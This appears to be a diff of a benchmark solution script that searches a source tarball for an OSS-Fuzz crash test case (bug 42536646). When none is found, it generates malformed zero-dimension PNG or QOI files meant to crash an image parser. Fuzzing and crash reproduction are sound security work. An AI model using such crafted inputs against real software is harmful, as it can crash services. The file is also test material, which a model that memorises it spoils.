@@ -1,191 +1,220 @@
 import os
 import tarfile
-import struct
 import zlib
-from typing import Optional
 
 
 class Solution:
+    BUG_ID_STR = "42536646"
+    EXPECTED_POC_LEN = 17814
+
+    IMAGE_EXTS = {
+        '.png', '.jpg', '.jpeg', '.jxl', '.webp', '.bmp', '.gif', '.tiff', '.tif',
+        '.pgm', '.ppm', '.pbm', '.pnm', '.ico', '.icns', '.svg', '.heic', '.heif',
+        '.avif', '.qoi', '.tga', '.pcx', '.psd', '.hdr', '.exr'
+    }
+
+    BINARY_EXTS = {'.bin', '.raw', '.dat', '.input', '.in', '.poc', '.img'}
+
+    TEXT_EXTS = {
+        '.txt', '.md', '.rst', '.c', '.cc', '.cpp', '.cxx', '.h', '.hpp',
+        '.py', '.java', '.go', '.rs', '.js', '.ts', '.html', '.xml', '.json',
+        '.yml', '.yaml'
+    }
+
     def solve(self, src_path: str) -> bytes:
         try:
-            with tarfile.open(src_path, "r:*") as tf:
-                members = tf.getmembers()
-                poc = self._find_embedded_poc(tf, members)
-                if poc is not None:
-                    return poc
-                fmt = self._infer_image_format(src_path, members)
+            with tarfile.open(src_path, 'r:*') as tf:
+                members = [m for m in tf.getmembers() if m.isfile() and m.size > 0]
+                bugid_candidates = []
+                zero_png_candidates = []
+                zero_svg_candidates = []
+
+                for m in members:
+                    name_lower = m.name.lower()
+                    base = os.path.basename(name_lower)
+                    dot_index = base.rfind('.')
+                    ext = base[dot_index:] if dot_index != -1 else ''
+
+                    if ext == '.png':
+                        header = self._read_member_prefix(tf, m, 64)
+                        if self._is_zero_dim_png(header):
+                            zero_png_candidates.append(m)
+
+                    if ext in ('.svg', '.xml', '.html', '.xhtml'):
+                        if m.size <= 512 * 1024:
+                            sample = self._read_member_prefix(tf, m, 4096)
+                            if self._is_zero_dim_svgish(sample):
+                                zero_svg_candidates.append(m)
+
+                    if (
+                        self.BUG_ID_STR in name_lower
+                        or 'oss-fuzz' in name_lower
+                        or 'clusterfuzz' in name_lower
+                    ):
+                        bugid_candidates.append(m)
+
+                if bugid_candidates:
+                    best = self._choose_best_member(tf, bugid_candidates, allow_bugid_bonus=True)
+                    data = self._read_member_full(tf, best)
+                    if data:
+                        return data
+
+                if zero_png_candidates:
+                    best = self._choose_best_member(tf, zero_png_candidates, allow_bugid_bonus=False)
+                    data = self._read_member_full(tf, best)
+                    if data:
+                        return data
+
+                if zero_svg_candidates:
+                    best = self._choose_best_member(tf, zero_svg_candidates, allow_bugid_bonus=False)
+                    data = self._read_member_full(tf, best)
+                    if data:
+                        return data
         except Exception:
-            # If anything goes wrong while inspecting the tarball, fall back to PNG
-            return self._generate_zero_png()
+            pass
 
-        if fmt == "qoi":
-            return self._generate_zero_qoi()
-        else:
-            return self._generate_zero_png()
+        return self._fallback_poc()
 
-    # ------------------------------------------------------------------ #
-    # Helper methods
-    # ------------------------------------------------------------------ #
-
-    def _read_member(self, tf: tarfile.TarFile, member: tarfile.TarInfo, max_size: int) -> Optional[bytes]:
-        if not member.isfile():
-            return None
-        if member.size <= 0 or member.size > max_size:
-            return None
+    def _read_member_prefix(self, tf: tarfile.TarFile, member: tarfile.TarInfo, length: int) -> bytes:
         try:
             f = tf.extractfile(member)
-            if f is None:
-                return None
-            data = f.read(max_size + 1)
-            f.close()
-            if not data:
-                return None
-            return data
+            if not f:
+                return b''
+            return f.read(length)
         except Exception:
-            return None
+            return b''
 
-    def _is_likely_image(self, data: bytes, ext: str) -> bool:
-        ext = ext.lower()
+    def _read_member_full(self, tf: tarfile.TarFile, member: tarfile.TarInfo) -> bytes:
+        try:
+            f = tf.extractfile(member)
+            if not f:
+                return b''
+            return f.read()
+        except Exception:
+            return b''
+
+    def _is_zero_dim_png(self, data: bytes) -> bool:
+        if len(data) < 8 + 8 + 13:
+            return False
+        if not data.startswith(b'\x89PNG\r\n\x1a\n'):
+            return False
+        ihdr_offset = 8
+        ihdr_len = int.from_bytes(data[ihdr_offset:ihdr_offset + 4], 'big')
+        if ihdr_len != 13:
+            return False
+        chunk_type = data[ihdr_offset + 4:ihdr_offset + 8]
+        if chunk_type != b'IHDR':
+            return False
+        width = int.from_bytes(data[ihdr_offset + 8:ihdr_offset + 12], 'big')
+        height = int.from_bytes(data[ihdr_offset + 12:ihdr_offset + 16], 'big')
+        return width == 0 or height == 0
+
+    def _is_zero_dim_svgish(self, data: bytes) -> bool:
         if not data:
             return False
-        if ext == ".png":
-            return data.startswith(b"\x89PNG\r\n\x1a\n")
-        if ext == ".gif":
-            return data.startswith(b"GIF87a") or data.startswith(b"GIF89a")
-        if ext in (".jpg", ".jpeg"):
-            return data.startswith(b"\xff\xd8")
-        if ext in (".bmp", ".dib"):
-            return data.startswith(b"BM")
-        if ext == ".webp":
-            return data.startswith(b"RIFF") and b"WEBP" in data[8:16]
-        if ext == ".qoi":
-            return data.startswith(b"qoif")
-        if ext in (".pnm", ".pgm", ".ppm", ".pbm"):
-            return len(data) >= 2 and data[0:1] == b"P" and data[1:2] in b"123456"
-        if ext == ".ico":
-            return len(data) >= 4 and data[0:2] == b"\x00\x00" and data[2:4] in (b"\x01\x00", b"\x02\x00")
-        if ext in (".tif", ".tiff"):
-            return data.startswith(b"II*\x00") or data.startswith(b"MM\x00*")
-        if ext in (".avif", ".heic"):
-            return b"ftyp" in data[:32]
-        if ext == ".exr":
-            return data.startswith(b"\x76\x2f\x31\x01")
-        # For unknown/other extensions, assume it might be an image
-        return True
+        try:
+            text = data.decode('utf-8', errors='ignore').lower()
+        except Exception:
+            return False
+        if 'width' not in text or 'height' not in text:
+            return False
+        width_patterns = ['width="0"', "width='0'", 'width="0px"', "width='0px'"]
+        height_patterns = ['height="0"', "height='0'", 'height="0px"', "height='0px'"]
+        has_w = any(p in text for p in width_patterns)
+        has_h = any(p in text for p in height_patterns)
+        return has_w and has_h
 
-    def _find_embedded_poc(self, tf: tarfile.TarFile, members) -> Optional[bytes]:
-        bug_id = "42536646"
-        image_exts = (
-            ".png",
-            ".gif",
-            ".bmp",
-            ".webp",
-            ".jpg",
-            ".jpeg",
-            ".tif",
-            ".tiff",
-            ".qoi",
-            ".pnm",
-            ".pgm",
-            ".ppm",
-            ".pbm",
-            ".ico",
-            ".avif",
-            ".heic",
-            ".exr",
-        )
+    def _score_member(self, tf: tarfile.TarFile, member: tarfile.TarInfo, allow_bugid_bonus: bool) -> int:
+        name = member.name.lower()
+        base = os.path.basename(name)
+        dot_index = base.rfind('.')
+        ext = base[dot_index:] if dot_index != -1 else ''
+        size = member.size or 0
 
-        interesting = []
-        for m in members:
-            if not m.isfile():
-                continue
-            name_lower = m.name.lower()
-            if (
-                bug_id in name_lower
-                or "poc" in name_lower
-                or "crash" in name_lower
-                or "testcase" in name_lower
-                or "repro" in name_lower
-                or "clusterfuzz" in name_lower
-            ):
-                interesting.append(m)
+        score = 0
 
-        candidates = [m for m in interesting if any(m.name.lower().endswith(ext) for ext in image_exts)]
-        if not candidates:
-            return None
+        if ext in self.IMAGE_EXTS:
+            score += 0
+        elif ext in self.BINARY_EXTS:
+            score += 10
+        elif ext in self.TEXT_EXTS:
+            score += 500
+        else:
+            score += 100
 
-        best_data = None
+        if allow_bugid_bonus:
+            if self.BUG_ID_STR in name:
+                score -= 5
+            if 'oss-fuzz' in name or 'clusterfuzz' in name:
+                score -= 4
+
+        if 'test' in name or 'regress' in name:
+            score -= 2
+        if 'poc' in name or 'crash' in name:
+            score -= 1
+        if 'corpus' in name:
+            score += 2
+
+        if size > 0:
+            score += abs(size - self.EXPECTED_POC_LEN) // 256
+
+        sample = self._read_member_prefix(tf, member, 2048)
+        if sample:
+            if b'\0' in sample:
+                score -= 3
+            else:
+                nontext = 0
+                for b in sample:
+                    if b < 9 or (13 < b < 32) or b > 126:
+                        nontext += 1
+                if nontext > len(sample) * 0.3:
+                    score -= 2
+                else:
+                    score += 2
+
+        return score
+
+    def _choose_best_member(self, tf: tarfile.TarFile, members, allow_bugid_bonus: bool) -> tarfile.TarInfo:
+        best_member = None
         best_score = None
-
-        for m in candidates:
-            name_lower = m.name.lower()
-            ext = None
-            for e in image_exts:
-                if name_lower.endswith(e):
-                    ext = e
-                    break
-            if ext is None:
-                continue
-            data = self._read_member(tf, m, max_size=500_000)
-            if data is None:
-                continue
-            if not self._is_likely_image(data, ext):
-                continue
-            score = abs(len(data) - 17814)
-            if best_data is None or score < best_score:
-                best_data = data
-                best_score = score
-
-        return best_data
-
-    def _infer_image_format(self, src_path: str, members) -> str:
-        # Build a combined lowercase string of path names to search for keywords
-        names = [os.path.basename(src_path)]
         for m in members:
-            # Only consider top-level directory or file names for quick hints
-            part = m.name.split("/", 1)[0]
-            names.append(part)
-        joined = " ".join(names).lower()
+            s = self._score_member(tf, m, allow_bugid_bonus)
+            if best_member is None or s < best_score:
+                best_member = m
+                best_score = s
+        return best_member
 
-        if "qoi" in joined:
-            return "qoi"
+    def _fallback_poc(self) -> bytes:
+        signature = b'\x89PNG\r\n\x1a\n'
 
-        # Heuristics for PNG-related projects (libpng, lodepng, spng, etc.)
-        if "libpng" in joined or "lodepng" in joined or "spng" in joined or "png" in joined:
-            return "png"
+        width = 0
+        height = 0
+        bit_depth = 8
+        color_type = 2
+        compression_method = 0
+        filter_method = 0
+        interlace_method = 0
 
-        # Default to PNG as a widely supported format
-        return "png"
+        ihdr_data = (
+            width.to_bytes(4, 'big') +
+            height.to_bytes(4, 'big') +
+            bytes([bit_depth, color_type, compression_method, filter_method, interlace_method])
+        )
+        ihdr_len = len(ihdr_data).to_bytes(4, 'big')
+        ihdr_type = b'IHDR'
+        ihdr_crc = zlib.crc32(ihdr_type + ihdr_data) & 0xffffffff
+        ihdr_chunk = ihdr_len + ihdr_type + ihdr_data + ihdr_crc.to_bytes(4, 'big')
 
-    # ------------------------------------------------------------------ #
-    # PoC generators
-    # ------------------------------------------------------------------ #
+        idat_data = zlib.compress(b'')
+        idat_len = len(idat_data).to_bytes(4, 'big')
+        idat_type = b'IDAT'
+        idat_crc = zlib.crc32(idat_type + idat_data) & 0xffffffff
+        idat_chunk = idat_len + idat_type + idat_data + idat_crc.to_bytes(4, 'big')
 
-    def _png_chunk(self, ctype: bytes, data: bytes) -> bytes:
-        length = struct.pack(">I", len(data))
-        crc = struct.pack(">I", zlib.crc32(ctype + data) & 0xFFFFFFFF)
-        return length + ctype + data + crc
+        iend_data = b''
+        iend_len = (0).to_bytes(4, 'big')
+        iend_type = b'IEND'
+        iend_crc = zlib.crc32(iend_type + iend_data) & 0xffffffff
+        iend_chunk = iend_len + iend_type + iend_crc.to_bytes(4, 'big')
 
-    def _generate_zero_png(self) -> bytes:
-        # PNG with width=0, height=1, grayscale 8-bit, minimal IDAT stream
-        signature = b"\x89PNG\r\n\x1a\n"
-        # width=0, height=1, bit depth=8, color type=0 (grayscale),
-        # compression=0, filter=0, interlace=0
-        ihdr_data = struct.pack(">IIBBBBB", 0, 1, 8, 0, 0, 0, 0)
-        ihdr = self._png_chunk(b"IHDR", ihdr_data)
-
-        # For width=0 and height=1, expected uncompressed scanline size is 1 byte (filter byte)
-        uncompressed = b"\x00"
-        idat_data = zlib.compress(uncompressed)
-        idat = self._png_chunk(b"IDAT", idat_data)
-
-        iend = self._png_chunk(b"IEND", b"")
-        return signature + ihdr + idat + iend
-
-    def _generate_zero_qoi(self) -> bytes:
-        # QOI header: magic 'qoif', width (4), height (4), channels (1), colorspace (1)
-        # Use width=0, height=1, channels=3, colorspace=0
-        header = b"qoif" + struct.pack(">II", 0, 1) + b"\x03\x00"
-        # QOI end marker: 7x 0x00 followed by 0x01
-        end_marker = b"\x00" * 7 + b"\x01"
-        return header + end_marker
+        return signature + ihdr_chunk + idat_chunk + iend_chunk
